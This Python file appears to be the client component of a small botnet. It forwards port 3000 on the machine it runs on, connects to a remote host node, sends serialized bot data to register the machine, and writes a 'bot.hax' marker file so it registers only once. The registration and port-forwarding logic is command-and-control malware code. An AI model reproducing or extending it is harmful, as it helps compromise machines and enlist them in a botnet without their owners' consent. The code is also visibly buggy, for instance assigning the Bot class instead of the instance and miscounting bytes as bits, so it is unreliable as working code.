from common import common
from common import commonio
from bot import bot
from common.commondefs import false
import socket
import sys
import os

class Client:
    def __init__(self, botRef: bot.Bot):
        self.bot = bot.Bot
        self.hostNode = common.RemoteAddr # Set host node addr for persistency
        self.bot.host = botRef.host # Set host for persistency

        try:
            common.forwardPort(3000) # Forward necessary port
        except Exception as e:
            print(e) # Log found error

        if os.path.isfile('bot.hax') == false:
            self.RegisterClient() # Register client
    
    def RegisterClient(self):
        if self.hostNode == '': # Check for nil host node
            return 'invalid host node' # Return error
            
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Init socket

        sock.connect((common.RemoteAddr, 3000)) # Connect socket

        print('-- CONNECTION -- connecting to host node with bot address '+self.bot.host)

        bot = self.bot # Get reference to bot

        serialized = bot.params_to_bytes(bot) # Attempt to serialize

        print('serialized bot data')

        sock.sendall(serialized) # Send self bot reference

        print('attempted to send '+str(len(serialized))+' bits of data') # Log send

        sock.close() # Close socket

        print('successfully wrote '+str(len(serialized))+' bits of data') # Log success

        print('-- CONNECTION-- closing connection\n')

        f = open('bot.hax', 'w') # Open file

        f.write('despacito') # Write success